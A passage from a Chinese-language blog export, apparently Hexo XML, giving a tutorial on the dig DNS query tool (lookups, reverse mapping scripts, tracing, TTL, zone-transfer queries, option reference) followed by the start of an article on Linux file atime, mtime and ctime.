<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ dig +nocmd ogi.edu any +multiline +noall +answer</span><br><span class="line">ogi.edu.   14267 IN A 129.95.59.31</span><br><span class="line">ogi.edu.   14267 IN MX 5 cse.ogi.edu.</span><br><span class="line">ogi.edu.   14267 IN MX 15 hermes.admin.ogi.edu.</span><br><span class="line">ogi.edu.   14267 IN SOA zeal.admin.ogi.edu. hostmaster.admin.ogi.edu. (</span><br><span class="line">                   200408230  ; serial</span><br><span class="line">                   14400      ; refresh (4 hours)</span><br><span class="line">                   900        ; retry (15 minutes)</span><br><span class="line">                   3600000    ; expire (5 weeks 6 days 16 hours)</span><br><span class="line">                   14400      ; minimum (4 hours)</span><br><span class="line">                   )</span><br><span class="line">ogi.edu.   14267 IN NS zeal.admin.ogi.edu.</span><br><span class="line">ogi.edu.   14267 IN NS cse.ogi.edu.</span><br><span class="line">ogi.edu.   14267 IN NS fork.admin.ogi.edu.</span><br></pre></td></tr></table></figure>

<h4 id="查找PTR记录？"><a href="#查找PTR记录？" class="headerlink" title="查找PTR记录？"></a><strong>查找PTR记录？</strong></h4><p>可以用 -x的选项查找IP地址的主机名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ dig -x 204.152.184.167 +short</span><br><span class="line">mx-1.isc.org.</span><br><span class="line">在这个循环中，脚本很灵活地在给出的子网中映射出名字。</span><br><span class="line">#!/bin/bash</span><br><span class="line">NET=18.7.22</span><br><span class="line">for n in $(seq 1 254); do</span><br><span class="line">  ADDR=$&#123;NET&#125;.$&#123;n&#125;</span><br><span class="line">  echo -e &quot;$&#123;ADDR&#125;\t$(dig -x $&#123;ADDR&#125; +short)&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p><strong>查询一个不同的命名服务器？</strong></p>
<p>查询命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @ns1.google.com  www.google.com</span><br></pre></td></tr></table></figure>

<p>使用/etc/resolv.conf里面的记录查询<br>主机将从/etc/resolv.conf文件里面自动查询DNS记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ host www</span><br><span class="line">www.wandouduoduo.com has address 65.102.49.170</span><br></pre></td></tr></table></figure>

<p>但是，默认情况下，dig会产生出一些意想不到的输出。如果你想查询本地主机名而不是全域名时候，使用<br>+search 选项</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig www +search</span><br></pre></td></tr></table></figure>

<p>处理大部分的查询？<br>如果你想查询大量的主机名，你可以把它们存放在一个文本文件中(一条记录一行)，使用带-f参数的dig来依<br>次查询。</p>
<p>查询大量的主机名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig -f /path/to/host-list.txt</span><br></pre></td></tr></table></figure>

<p>相同的，更明确的输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig -f /path/to/host-list.txt +noall +answer</span><br></pre></td></tr></table></figure>

<p>但是我要告诉你的是，dig 9.2.3以及以后的版本都不支持使用-f的选项反向查询了。</p>
<h4 id="验证DNS映射"><a href="#验证DNS映射" class="headerlink" title="验证DNS映射"></a>验证DNS映射</h4><p>不正确的DNS配置会给你带来很多苦恼，你可以通过如下两种方式验证你的DNS配置：<br>1.每个主机名应该被解析到一个IP地址，而且那个IP地址也应该反指向那个主机名。<br>2.如果你子网上一个地址被反指向一个主机名，那么那个主机名也必须指向这个IP。<br>对于这两条规则来说，还有一些例外情况，比如CNAME应该首先解析到另外一个主机名，而且只能指向一个IP<br>，有时多个主机名指向了相同的IP地址，但是那个IP只能有一个PTR记录。<br>综上，这些有助于你检查你的DNS映射是否像你想象的那样工作。<br>你也可以编写一个测试脚本写入你已知的主机名，如下所示，内容很简单；它执行时当捕捉到一个CNAME时它<br>就会中断，如果多个主机名指向同一个IP地址它会报错。我们假设这个文件包含你的主机名叫做named-hosts。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">test</span> DNS forward- and reverse-mapping</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> edit this variable to reflect <span class="built_in">local</span> class C subnet(s)</span></span><br><span class="line">NETS="192.168.1 192.168.2"</span><br><span class="line"><span class="meta">#</span><span class="bash"> Test name to address to name validity</span></span><br><span class="line">echo</span><br><span class="line">echo -e "\tname -&gt; address -&gt; name"</span><br><span class="line">echo '----------------------------------'</span><br><span class="line">while read H; do</span><br><span class="line">  ADDR=$(dig $H +short)</span><br><span class="line">  if test -n "$ADDR"; then</span><br><span class="line">    HOST=$(dig -x $ADDR +short)</span><br><span class="line">    if test "$H" = "$HOST"; then</span><br><span class="line">      echo -e "ok\t$H -&gt; $ADDR -&gt; $HOST"</span><br><span class="line">    elif test -n "$HOST"; then</span><br><span class="line">      echo -e "fail\t$H -&gt; $ADDR -&gt; $HOST"</span><br><span class="line">    else</span><br><span class="line">      echo -e "fail\t$H -&gt; $ADDR -&gt; [unassigned]"</span><br><span class="line">    fi</span><br><span class="line">  else</span><br><span class="line">    echo -e "fail\t$H -&gt; [unassigned]"</span><br><span class="line">  fi</span><br><span class="line">done &lt; named-hosts</span><br><span class="line"><span class="meta">#</span><span class="bash"> Test address to name to address validity</span></span><br><span class="line">echo</span><br><span class="line">echo -e "\taddress -&gt; name -&gt; address"</span><br><span class="line">echo '-------------------------------------'</span><br><span class="line">for NET in $NETS; do</span><br><span class="line">  for n in $(seq 1 254); do</span><br><span class="line">    A=$&#123;NET&#125;.$&#123;n&#125;</span><br><span class="line">    HOST=$(dig -x $A +short)</span><br><span class="line">    if test -n "$HOST"; then</span><br><span class="line">      ADDR=$(dig $HOST +short)</span><br><span class="line">      if test "$A" = "$ADDR"; then</span><br><span class="line">        echo -e "ok\t$A -&gt; $HOST -&gt; $ADDR"</span><br><span class="line">      elif test -n "$ADDR"; then</span><br><span class="line">        echo -e "fail\t$A -&gt; $HOST -&gt; $ADDR"</span><br><span class="line">      else</span><br><span class="line">        echo -e "fail\t$A -&gt; $HOST -&gt; [unassigned]"</span><br><span class="line">      fi</span><br><span class="line">    fi</span><br><span class="line">  done</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h2 id="有趣的dig"><a href="#有趣的dig" class="headerlink" title="有趣的dig"></a><strong>有趣的dig</strong></h2><h4 id="创建属于你自己的named-root文件"><a href="#创建属于你自己的named-root文件" class="headerlink" title="创建属于你自己的named.root文件"></a>创建属于你自己的named.root文件</h4><p>任何连接到internet 的DNS服务器肯定会有InterNIC的named.root文件的拷贝，文件列出所有internet的根<br>DNS，如果你不怕麻烦的话，你可以经常从InterNIC的ftp服务器上把它下载下来，或者，你可以使用dig命令<br>创建属于你自己的时髦的named.root</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># compare with [ftp://ftp.internic.net/domain/named.root]()</span><br><span class="line">dig +nocmd . NS +noall +answer +additional</span><br></pre></td></tr></table></figure>

<p>你的TTL值在这边可能会很小，但是它是你找到最新的named.root文件！</p>
<h4 id="跟踪dig的查询路径"><a href="#跟踪dig的查询路径" class="headerlink" title="跟踪dig的查询路径"></a><strong>跟踪dig的查询路径</strong></h4><p>你可能是个traceroute的狂热爱好者，经常喜欢查看如何从点A连接点B。那你可以使用dig +trace选项做类似<br>的事。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig gentoo.de +trace</span><br></pre></td></tr></table></figure>

<p>你可以在dig输出的头部分看到根DNS，然后找到负责解析所有*.de的DNS，最后找到gentoo.de的域名IP。</p>
<h4 id="获取SOA记录"><a href="#获取SOA记录" class="headerlink" title="获取SOA记录"></a><strong>获取SOA记录</strong></h4><p>作为一个DNS管理员，我有时会（对DNS配置）做一些改变，并且想知道我的DNS解析是否推送的还是旧数据，<br>这个+nssearch选项可以给你的公众服务器提供清楚的统计信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> the unvarnished truth</span></span><br><span class="line">dig cse.ogi.edu +nssearch</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> the same, displaying only serial number and hostname</span></span><br><span class="line">dig cse.ogi.edu +nssearch | cut -d' ' -f4,11</span><br></pre></td></tr></table></figure>

<h4 id="解释TTL数值"><a href="#解释TTL数值" class="headerlink" title="解释TTL数值"></a><strong>解释TTL数值</strong></h4><p>我喜爱google有很多原因，其中一个原因就是它在我的WEB日志中提供了精确的链接，它会使我很容易地指出<br>哪种类型的查询引导人们来访问这个站点的页面。<br>出乎意料的是，我已经看到很多请求要求查询TTL数值，我从来没想到TTL会成为最受欢迎的东东，但是你每天<br>都在学习新东西，所以，应大家的要求，这里稍微介绍一下TTL。<br>如果你从本地DNS查询互联网地址，服务器指出从哪里获得权威的答案并获得地址，一旦服务器获知答案，它<br>将这个答案保存在本地缓存中以免你在稍后的时间内再次查询同样的地址，这样它就会很快地从缓存中获取你<br>要的答案，比你再次从internet查询要快很多。<br>当域管理员配置DNS记录时，他们可以决定这个记录可以在缓存中保存多长时间，这就是TTL数值（通常用多少<br>秒来表示）。<br>通常地，远端服务器一般对记录的缓存只保存TTL数值长的时间。时间过期后，服务器会刷新它的本地缓存并<br>重新查询一个权威答案。<br>当你用dig来查询DNS服务器某条记录时，服务器会告诉dig这条记录可以在缓存中保持的时间长短。<br>举个例子，像上面写的那样，gmail.com域的MX记录的TTL值是300s，gmail.com域的管理员要求远端服务器缓<br>存它的MX记录不能高于5分钟，所以当你第一次查询那个记录（gmail.com的MX记录）时，dig会告诉你一个300<br>的TTL。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dig +nocmd gmail.com MX +noall +answer</span></span><br><span class="line">gmail.com.        300     IN      MX      20 gsmtp57.google.com.</span><br><span class="line">gmail.com.        300     IN      MX      10 gsmtp171.google.com.</span><br><span class="line">如果你一段时间后再去查，你会发现TTL值减少为280（中间隔了20s）。</span><br><span class="line"><span class="meta">$</span><span class="bash"> dig +nocmd gmail.com MX +noall +answer</span></span><br><span class="line">gmail.com.        280     IN      MX      10 gsmtp171.google.com.</span><br><span class="line">gmail.com.        280     IN      MX      20 gsmtp57.google.com.</span><br><span class="line">如果你的时间计算得足够好，你会获取这条记录的最后生存时间。</span><br><span class="line"><span class="meta">$</span><span class="bash"> dig +nocmd gmail.com MX +noall +answer</span></span><br><span class="line">gmail.com.        1       IN      MX      10 gsmtp171.google.com.</span><br><span class="line">gmail.com.        1       IN      MX      20 gsmtp57.google.com.</span><br></pre></td></tr></table></figure>

<p>在那之后，你查询的DNS服务器会“忘记”这个问题的答案，在你下次查询这条记录时，整个循环又将开始（本例子中是300s）。</p>
<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p><strong>在 unix 和 linux 下，建议大家使用 dig 命令来代替 nslookup。 dig 命令的功能比 nslookup 强大很多，不像 nslookkup 还得 set 来 set 去的，怪麻烦的。</strong></p>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>下面是 dig 的一些比较常用的命令: </p>
<h4 id="dig-最基本的用法"><a href="#dig-最基本的用法" class="headerlink" title="dig 最基本的用法"></a>dig 最基本的用法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @server qianlong.com</span><br></pre></td></tr></table></figure>

<h4 id="用-dig-查看-zone-数据传输"><a href="#用-dig-查看-zone-数据传输" class="headerlink" title="用 dig 查看 zone 数据传输"></a>用 dig 查看 zone 数据传输</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @server qianlong.com AXFR</span><br></pre></td></tr></table></figure>

<h4 id="用-dig-查看-zone-数据的增量传输"><a href="#用-dig-查看-zone-数据的增量传输" class="headerlink" title="用 dig 查看 zone 数据的增量传输"></a>用 dig 查看 zone 数据的增量传输</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @server qianlong.com IXFR=N</span><br></pre></td></tr></table></figure>

<h4 id="用-dig-查看反向解析"><a href="#用-dig-查看反向解析" class="headerlink" title="用 dig 查看反向解析"></a>用 dig 查看反向解析</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig -x 124.42.102.203 @server</span><br></pre></td></tr></table></figure>

<h4 id="查找一个域的授权-dns-服务器"><a href="#查找一个域的授权-dns-服务器" class="headerlink" title="查找一个域的授权 dns 服务器"></a>查找一个域的授权 dns 服务器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig  qianlong.com +nssearch</span><br></pre></td></tr></table></figure>

<h4 id="从根服务器开始追踪一个域名的解析过程"><a href="#从根服务器开始追踪一个域名的解析过程" class="headerlink" title="从根服务器开始追踪一个域名的解析过程"></a>从根服务器开始追踪一个域名的解析过程</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig  qianlong.com +trace</span><br></pre></td></tr></table></figure>

<h4 id="查看你使用的是哪个-F-root-dns-server"><a href="#查看你使用的是哪个-F-root-dns-server" class="headerlink" title="查看你使用的是哪个 F root dns server"></a>查看你使用的是哪个 F root dns server</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig +norec @F.ROOT-SERVERS.NET HOSTNAME.BIND CHAOS TXT</span><br></pre></td></tr></table></figure>

<h4 id="查看-bind-的版本号"><a href="#查看-bind-的版本号" class="headerlink" title="查看 bind 的版本号"></a>查看 bind 的版本号</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @bind_dns_server CHAOS TXT version.bind</span><br></pre></td></tr></table></figure>

<p>你可以到 <a href="http://www.isc.org" target="_blank" rel="noopener">www.isc.org</a> 去下载一个 bind for windows 的版本安装，安装后就可以在 windows 上使用 dig 命令了。^O^</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp://ftp.isc.org/isc/bind/contrib/ntbind-9.3.0/BIND9.3.0.zip</span><br></pre></td></tr></table></figure>

<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig [@server] [-b address] [-c class] [-f filename] [-k filename] [ -n ][-p port#] [-t type] [-x addr] [-y name:key] [name] [type] [class] [queryopt...]</span><br><span class="line">dig [-h]</span><br><span class="line">dig [global-queryopt...] [query...]</span><br><span class="line">描述</span><br><span class="line">dig（域信息搜索器）命令是一个用于询问 DNS 域名服务器的灵活的工具。它执行 DNS 搜索，显示从受请求的域名服务器返回的答复。多数 DNS 管理员利用 dig 作为 DNS 问题的故障诊断，因为它灵活性好、易用、输出清晰。虽然通常情况下 dig 使用命令行参数，但它也可以按批处理模式从文件读取搜索请求。不同于早期版本，dig 的 BIND9 实现允许从命令行发出多个查询。除非被告知请求特定域名服务器，dig 将尝试 /etc/resolv.conf 中列举的所有服务器。当未指定任何命令行参数或选项时，dig 将对“.”（根）执行 NS 查询。</span><br><span class="line">标志</span><br><span class="line">-b address 设置所要询问地址的源 IP 地址。这必须是主机网络接口上的某一合法的地址。</span><br><span class="line">-c class 缺省查询类（IN for internet）由选项 -c 重设。class 可以是任何合法类，比如查询 Hesiod 记录的 HS 类或查询 CHAOSNET 记录的 CH 类。</span><br><span class="line">-f filename 使 dig 在批处理模式下运行，通过从文件 filename 读取一系列搜索请求加以处理。文件包含许多查询；每行一个。文件中的每一项都应该以和使用命令行接口对 dig 的查询相同的方法来组织。</span><br><span class="line">-h 当使用选项 -h 时，显示一个简短的命令行参数和选项摘要。</span><br><span class="line">-k filename 要签署由 dig 发送的 DNS 查询以及对它们使用事务签名（TSIG）的响应，用选项 -k 指定 TSIG 密钥文件。</span><br><span class="line">-n 缺省情况下，使用 IP6.ARPA 域和 RFC2874 定义的二进制标号搜索 IPv6 地址。为了使用更早的、使用 IP6.INT 域和 nibble 标签的 RFC1886 方法，指定选项 -n（nibble）。</span><br><span class="line">-p port# 如果需要查询一个非标准的端口号，则使用选项 -p。port# 是 dig 将发送其查询的端口号，而不是标准的 DNS 端口号 53。该选项可用于测试已在非标准端口号上配置成侦听查询的域名服务器。</span><br><span class="line">-t type 设置查询类型为 type。可以是 BIND9 支持的任意有效查询类型。缺省查询类型是 A，除非提供 -x 选项来指示一个逆向查询。通过指定 AXFR 的 type 可以请求一个区域传输。当需要增量区域传输（IXFR）时，type 设置为 ixfr=N。增量区域传输将包含自从区域的 SOA 记录中的序列号改为 N 之后对区域所做的更改。</span><br><span class="line">-x addr 逆向查询（将地址映射到名称）可以通过 -x 选项加以简化。addr 是一个以小数点为界的 IPv4 地址或冒号为界的 IPv6 地址。当使用这个选项时，无需提供 name、class 和 type 参数。dig 自动运行类似 11.12.13.10.in-addr.arpa 的域名查询，并分别设置查询类型和类为 PTR 和 IN。</span><br><span class="line">-y name:key 您可以通过命令行上的 -y 选项指定 TSIG 密钥；name 是 TSIG 密码的名称，key 是实际的密码。密码是 64 位加密字符串，通常由 dnssec-keygen（8）生成。当在多用户系统上使用选项 -y 时应该谨慎，因为密码在 ps（1）的输出或 shell 的历史文件中可能是可见的。当同时使用 dig 和 TSCG 认证时，被查询的名称服务器需要知道密码和解码规则。在 BIND 中，通过提供正确的密码和 named.conf 中的服务器声明实现。</span><br><span class="line">参数</span><br><span class="line">global-queryopt... 全局查询选项（请参阅多个查询）。</span><br><span class="line">查询 查询选项（请参阅查询选项）。</span><br><span class="line">查询选项</span><br><span class="line">dig 提供查询选项号，它影响搜索方式和结果显示。一些在查询请求报头设置或复位标志位，一部分决定显示哪些回复信息，其它的确定超时和重试战略。每个查询选项被带前缀（+）的关键字标识。一些关键字设置或复位一个选项。通常前缀是求反关键字含义的字符串 no。其他关键字分配各选项的值，比如超时时间间隔。它们的格式形如 +keyword=value。查询选项是：</span><br><span class="line">+[no]tcp</span><br><span class="line">查询域名服务器时使用 [不使用] TCP。缺省行为是使用 UDP，除非是 AXFR 或 IXFR 请求，才使用 TCP 连接。</span><br><span class="line">+[no]vc</span><br><span class="line">查询名称服务器时使用 [不使用] TCP。+[no]tcp 的备用语法提供了向下兼容。 vc 代表虚电路。</span><br><span class="line">+[no]ignore</span><br><span class="line">忽略 UDP 响应的中断，而不是用 TCP 重试。缺省情况运行 TCP 重试。</span><br><span class="line">+domain=somename</span><br><span class="line">设定包含单个域 somename 的搜索列表，好像被 /etc/resolv.conf 中的域伪指令指定，并且启用搜索列表处理，好像给定了 +search 选项。</span><br><span class="line">+[no]search</span><br><span class="line">使用 [不使用] 搜索列表或 resolv.conf 中的域伪指令（如果有的话）定义的搜索列表。缺省情况不使用搜索列表。</span><br><span class="line">+[no]defname</span><br><span class="line">不建议看作 +[no]search 的同义词。</span><br><span class="line">+[no]aaonly</span><br><span class="line">该选项不做任何事。它用来提供对设置成未实现解析器标志的 dig 的旧版本的兼容性。</span><br><span class="line">+[no]adflag</span><br><span class="line">在查询中设置 [不设置] AD（真实数据）位。目前 AD 位只在响应中有标准含义，而查询中没有，但是出于完整性考虑在查询中这种性能可以设置。</span><br><span class="line">+[no]cdflag</span><br><span class="line">在查询中设置 [不设置] CD（检查禁用）位。它请求服务器不运行响应信息的 DNSSEC 合法性。</span><br><span class="line">+[no]recursive</span><br><span class="line">切换查询中的 RD（要求递归）位设置。在缺省情况下设置该位，也就是说 dig 正常情形下发送递归查询。当使用查询选项 +nssearch 或 +trace 时，递归自动禁用。</span><br><span class="line">+[no]nssearch</span><br><span class="line">这个选项被设置时，dig 试图寻找包含待搜名称的网段的权威域名服务器，并显示网段中每台域名服务器的 SOA 记录。</span><br><span class="line">+[no]trace</span><br><span class="line">切换为待查询名称从根名称服务器开始的代理路径跟踪。缺省情况不使用跟踪。一旦启用跟踪，dig 使用迭代查询解析待查询名称。它将按照从根服务器的参照，显示来自每台使用解析查询的服务器的应答。</span><br><span class="line">+[no]cmd</span><br><span class="line">设定在输出中显示指出 dig 版本及其所用的查询选项的初始注释。缺省情况下显示注释。</span><br><span class="line">+[no]short</span><br><span class="line">提供简要答复。缺省值是以冗长格式显示答复信息。</span><br><span class="line">+[no]identify</span><br><span class="line">当启用 +short 选项时，显示 [或不显示] 提供应答的 IP 地址和端口号。如果请求简短格式应答，缺省情况不显示提供应答的服务器的源地址和端口号。</span><br><span class="line">+[no]comments</span><br><span class="line">切换输出中的注释行显示。缺省值是显示注释。</span><br><span class="line">+[no]stats</span><br><span class="line">该查询选项设定显示统计信息：查询进行时，应答的大小等等。缺省显示查询统计信息。</span><br><span class="line">+[no]qr</span><br><span class="line">显示 [不显示] 发送的查询请求。缺省不显示。</span><br><span class="line">+[no]question</span><br><span class="line">当返回应答时，显示 [不显示] 查询请求的问题部分。缺省作为注释显示问题部分。</span><br><span class="line">+[no]answer</span><br><span class="line">显示 [不显示] 应答的回答部分。缺省显示。</span><br><span class="line">+[no]authority</span><br><span class="line">显示 [不显示] 应答的权限部分。缺省显示。</span><br><span class="line">+[no]additional</span><br><span class="line">显示 [不显示] 应答的附加部分。缺省显示。</span><br><span class="line">+[no]all</span><br><span class="line">设置或清除所有显示标志。</span><br><span class="line">+time=T</span><br><span class="line">为查询设置超时时间为 T 秒。缺省是5秒。如果将 T 设置为小于1的数，则以1秒作为查询超时时间。</span><br><span class="line">+tries=A</span><br><span class="line">设置向服务器发送 UDP 查询请求的重试次数为 A，代替缺省的 3 次。如果把 A 小于或等于 0，则采用 1 为重试次数。</span><br><span class="line">+ndots=D</span><br><span class="line">出于完全考虑，设置必须出现在名称 D 的点数。缺省值是使用在 /etc/resolv.conf 中的 ndots 语句定义的，或者是 1，如果没有 ndots 语句的话。带更少点数的名称被解释为相对名称，并通过搜索列表中的域或文件 /etc/resolv.conf 中的域伪指令进行搜索。</span><br><span class="line">+bufsize=B</span><br><span class="line">设置使用 EDNS0 的 UDP 消息缓冲区大小为 B 字节。缓冲区的最大值和最小值分别为 65535 和 0。超出这个范围的值自动舍入到最近的有效值。</span><br><span class="line">+[no]multiline</span><br><span class="line">以详细的多行格式显示类似 SOA 的记录，并附带可读注释。缺省值是每单个行上显示一条记录，以便于计算机解析 dig 的输出。</span><br></pre></td></tr></table></figure>

<h2 id="多条查询"><a href="#多条查询" class="headerlink" title="多条查询"></a>多条查询</h2><p>dig 的 BIND9 支持在命令行上指定多个查询（支持 -f 批处理文件选项的附加功能）。每条查询可以使用自己的标志位、选项和查询选项。<br>在这种情况下，在上面描述的命令行语法中，每条查询自变量代表一个个别查询。每一条由任意标准选项和标志、待查询名称、可选查询类型和类以及任何适用于该查询的查询选项。<br>也可以使用对所有查询均有效的查询选项全局集合。全局查询选项必须位于命令行上第一个名称、类、类型、选项、标志和查询选项的元组之前。任何全局查询选项（除了 +[no]cmd 选项）可以被下面的查询特别选项重设。例如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig +qr www.isc.org any -x 127.0.0.1 isc.org ns +noqr显示 dig 如何从命令行出发进行三个查询：一个针对 www.isc.org的任意查询、一个 127.0.0.1 的逆向查询，以及一个 isc.org 的 NS 记录查询。应用了 +qr 的全局查询选项，以便 dig 显示进行每条查询的初始查询。最后那个查询有一个本地查询选项 +noqr，表示 dig 在搜索 isc.org 的 NS 记录时不显示初始查询。</span><br></pre></td></tr></table></figure>

<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>一个典型的 dig 调用类似：<br>dig @server name type其中：<br>server<br>待查询名称服务器的名称或 IP 地址。可以是用点分隔的 IPv4 地址或用冒号分隔的 IPv6 地址。当由主机提供服务器参数时，dig 在查询域名服务器前先解析那个名称。如果没有服务器参数可以提供，dig 参考 /etc/resolv.conf，然后查询列举在那里的域名服务器。显示来自域名服务器的应答。<br>name<br>将要查询的资源记录的名称。<br>type<br>显示所需的查询类型 － ANY、A、MX、SIG，以及任何有效查询类型等。如果不提供任何类型参数，dig 将对纪录 A 执行查询。</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>命令详解</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>详解linux中文件的三种time</title>
    <url>/articles/3b236ad9.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>linux下文件有3个时间的，分别是atime,mtime,ctime。有些博友对这3个时间还是比较迷茫和困惑的，我整理了下，写下来希望对博友们有所帮助。</p>
<a id="more"></a>

<h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><table>
<thead>
<tr>
<th>简名</th>
<th>全名</th>
<th>中文名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>atime</td>
<td>access time</td>
<td>访问时间</td>
<td>文件中的数据库最后被访问的时间</td>
</tr>
<tr>
<td>mtime</td>
<td>modify time</td>
<td>修改时间</td>
<td>文件内容被修改的最后时间</td>
</tr>
<tr>
<td>ctime</td>
<td>change time</td>
<td>变化时间</td>
<td>文件的元数据发生变化。比如权限，所有者等</td>
</tr>
</tbody></table>
<h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 time]# pwd</span><br><span class="line">/app/time</span><br><span class="line">[root@centos7 time]# ll</span><br><span class="line">total 8</span><br><span class="line">-rw-------. 1 root root 1933 Nov 11 08:14 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 root root   59 Nov 11 08:15 issue</span><br><span class="line">[root@centos7 time]# stat issue </span><br><span class="line">  File: ‘issue’</span><br><span class="line">  Size: 59            Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: 805h/2053d    Inode: 261123      Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Context: unconfined_u:object_r:etc_runtime_t:s0</span><br><span class="line">Access: 2017-11-11 08:15:05.650986739 +0800</span><br><span class="line">Modify: 2017-11-11 08:15:05.650986739 +0800</span><br><span class="line">Change: 2017-11-11 08:15:05.650986739 +0800</span><br><span class="line"> Birth: -</span><br><span class="line">[root@centos7 time]# ls -l                               #默认的ls -l显示的是mtime     </span><br><span class="line">total 8</span><br><span class="line">-rw-------. 1 root      root 1933 Nov 11 08:14 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 zhaojiedi root   71 Nov 11 09:05 issue</span><br><span class="line">[root@centos7 time]# ls -l --time=atime                             #列出文件的atime</span><br><span class="line">total 8</span><br><span class="line">-rw-------. 1 root      root 1933 Nov 11 08:14 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 zhaojiedi root   71 Nov 11 09:12 issue</span><br><span class="line">[root@centos7 time]# ls -l --time=ctime　　　　　　　　　　　　　　　 #列出ctime</span><br><span class="line">total 8</span><br><span class="line">-rw-------. 1 root      root 1933 Nov 11 08:14 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 zhaojiedi root   71 Nov 11 09:03 issue</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="3-1-准备工作"><a href="#3-1-准备工作" class="headerlink" title="3.1 准备工作"></a>3.1 准备工作</h3><p>测试前，我们需要先关闭文件系统的relatime特性。这个随后在说，具体操作如下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 time]# mount -o remount,strictatime /app  # 重新挂载我们的/app，并修改文件系统工作在严格atime上，也就是不启用了默认的relatime支持。</span><br><span class="line">[root@centos7 time]# mount |grep /app                   #查看我们的修改</span><br><span class="line">/dev/sda5 on /app type ext4 (rw,seclabel,data=ordered)</span><br></pre></td></tr></table></figure>

<h3 id="3-2-读取文件"><a href="#3-2-读取文件" class="headerlink" title="3.2 读取文件"></a>3.2 读取文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@centos7 time]# stat issue                             #先获取3个时间</span><br><span class="line">  File: ‘issue’</span><br><span class="line">  Size: 59            Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: 805h/2053d    Inode: 261123      Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Context: unconfined_u:object_r:etc_runtime_t:s0</span><br><span class="line">Access: 2017-11-11 08:15:05.650986739 +0800</span><br><span class="line">Modify: 2017-11-11 08:15:05.650986739 +0800</span><br><span class="line">Change: 2017-11-11 08:15:05.650986739 +0800</span><br><span class="line"> Birth: -</span><br><span class="line">[root@centos7 time]# cat issue                             #读取下</span><br><span class="line">\S</span><br><span class="line">Kernel \r on an \m</span><br><span class="line">tty:   \l</span><br><span class="line">hostname:   \n</span><br><span class="line">time:    \t</span><br><span class="line">[root@centos7 time]# stat issue 　　　　　　　　　　　　　　　#再次查看3个时间</span><br><span class="line">  File: ‘issue’</span><br><span class="line">  Size: 59            Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: 805h/2053d    Inode: 261123      Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Context: unconfined_u:object_r:etc_runtime_t:s0</span><br><span class="line">Access: 2017-11-11 08:57:40.858948780 +0800</span><br><span class="line">Modify: 2017-11-11 08:15:05.650986739 +0800</span><br><span class="line">Change: 2017-11-11 08:15:05.650986739 +0800</span><br><span class="line"> Birth: -</span><br></pre></td></tr></table></figure>

<p>通过上面的分析，我们可以看出来，在使用cat读取文件后，文件的atime发生了改变。其他的没有改变。</p>
